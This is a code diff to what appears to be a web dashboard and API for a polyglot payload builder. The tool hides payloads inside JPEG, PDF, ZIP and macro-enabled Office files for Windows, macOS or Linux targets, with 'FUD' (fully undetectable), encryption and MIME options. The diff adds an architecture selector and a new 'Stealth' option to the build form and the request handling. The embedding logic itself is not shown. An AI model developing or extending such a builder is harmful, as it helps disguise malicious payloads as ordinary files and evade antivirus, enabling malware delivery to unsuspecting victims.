@@ -358,9 +358,11 @@ def api_build():
         container = request.form.get('container_type', 'jpeg')
         payload_type = request.form.get('payload_type', '') or None
         target_os = request.form.get('target_os', 'windows')
+        arch = request.form.get('arch', 'x86-64').lower()
         encrypt = request.form.get('encrypt', 'false') == 'true'
         fud = request.form.get('fud', 'false') == 'true'
         mime = request.form.get('mime', 'false') == 'true'
+        stealth = request.form.get('stealth', 'false') == 'true'
         # Validate container type — whitelist only
         allowed_containers = {'jpeg','jpg','png','gif','bmp','pdf','zip','docx','xlsx','mp4','webm'}
         if container not in allowed_containers:
@@ -368,6 +370,11 @@ def api_build():
         allowed_os = {'windows','macos','linux'}
         if target_os not in allowed_os:
             return jsonify({'error': f'Invalid target_os: {target_os}'}), 400
+        allowed_archs = {'x86-64','arm64','arm32'}
+        if arch not in allowed_archs:
+            return jsonify({'error': f'Invalid arch: {arch}. Valid: {",".join(allowed_archs)}'}), 400
+        if arch == 'arm32' and target_os != 'linux':
+            return jsonify({'error': 'ARM32 only supported on Linux'}), 400
         # Sanitize output filename
         safe_output = sanitize_filename(f'polyglot_output.{container}')
         output = safe_output
@@ -378,16 +385,23 @@ def api_build():
         container = data.get('container', data.get('container_type', 'jpeg'))
         payload_type = data.get('payload_type', None)
         target_os = data.get('target_os', 'windows')
+        arch = data.get('arch', 'x86-64').lower()
         encrypt = data.get('encrypt', False)
         fud = data.get('fud', False)
         mime = data.get('mime', False)
-        # Validate container and OS
+        stealth = data.get('stealth', False)
+        # Validate container, OS, and arch
         allowed_containers = {'jpeg','jpg','png','gif','bmp','pdf','zip','docx','xlsx','mp4','webm'}
         if container not in allowed_containers:
             return jsonify({'error': f'Invalid container: {container}'}), 400
         allowed_os = {'windows','macos','linux'}
         if target_os not in allowed_os:
             return jsonify({'error': f'Invalid target_os: {target_os}'}), 400
+        allowed_archs = {'x86-64','arm64','arm32'}
+        if arch not in allowed_archs:
+            return jsonify({'error': f'Invalid arch: {arch}. Valid: {",".join(allowed_archs)}'}), 400
+        if arch == 'arm32' and target_os != 'linux':
+            return jsonify({'error': 'ARM32 only supported on Linux'}), 400
         output = sanitize_filename(data.get('output', f'polyglot.{container}'))
 
     # Validate paths
@@ -400,7 +414,8 @@ def api_build():
 
     try:
         stats = state.builder.build(safe_cover, safe_payload, output, container, encrypt, fud, mime,
-                                     payload_type=payload_type, target_os=target_os)
+                                     payload_type=payload_type, target_os=target_os,
+                                     arch=arch, stealth=stealth)
         state.stats['built'] += 1
         # Generate a temp ID for download
         import uuid
@@ -771,14 +786,21 @@ hr{border-color:#1e2d3d;margin:12px 0}
           <option value="xlsx">Excel Macro</option><option value="docx">Word Macro</option>
         </select>
       </div>
-      <select id="build-target-os" style="background:#0d1520;color:#c5d0db;border:1px solid #1e2d3d;border-radius:6px;padding:8px;font-size:12px;width:100%;margin:4px 0">
-        <option value="windows">Target: Windows</option><option value="linux">Target: Linux</option>
-        <option value="macos">Target: macOS</option><option value="all">Target: All (3 variants)</option>
-      </select>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;margin:4px 0">
+        <select id="build-target-os" style="background:#0d1520;color:#c5d0db;border:1px solid #1e2d3d;border-radius:6px;padding:8px;font-size:12px;width:100%">
+          <option value="windows">Target: Windows</option><option value="linux">Target: Linux</option>
+          <option value="macos">Target: macOS</option><option value="all">Target: All (3 variants)</option>
+        </select>
+        <select id="build-arch" style="background:#0d1520;color:#c5d0db;border:1px solid #1e2d3d;border-radius:6px;padding:8px;font-size:12px;width:100%">
+          <option value="x86-64">Arch: x86-64</option><option value="arm64">Arch: ARM64 (AArch64)</option>
+          <option value="arm32">Arch: ARM32 (Linux only)</option>
+        </select>
+      </div>
       <div style="display:flex;gap:6px;margin:6px 0">
         <label class="chk"><input type="checkbox" id="build-encrypt"> Encrypt</label>
         <label class="chk"><input type="checkbox" id="build-fud"> FUD</label>
         <label class="chk"><input type="checkbox" id="build-mime"> MIME</label>
+        <label class="chk"><input type="checkbox" id="build-stealth"> Stealth</label>
       </div>
       <button class="btn orange" onclick="buildPolyglot()" id="btn-build">&#9889; BUILD POLYGLOT</button>
 
@@ -976,9 +998,11 @@ async function buildPolyglot(){
     fd.append('container_type',document.getElementById('build-container').value);
     fd.append('payload_type',document.getElementById('build-payload-type').value);
     fd.append('target_os',document.getElementById('build-target-os').value);
+    fd.append('arch',document.getElementById('build-arch').value);
     fd.append('encrypt',document.getElementById('build-encrypt').checked);
     fd.append('fud',document.getElementById('build-fud').checked);
     fd.append('mime',document.getElementById('build-mime').checked);
+    fd.append('stealth',document.getElementById('build-stealth').checked);
     const r=await fetch('/api/build',{method:'POST',body:fd}).then(r=>r.json());
     if(r.error){showToast('Build error: '+r.error,'error');return}
     let html='<div style="margin:8px 0">';
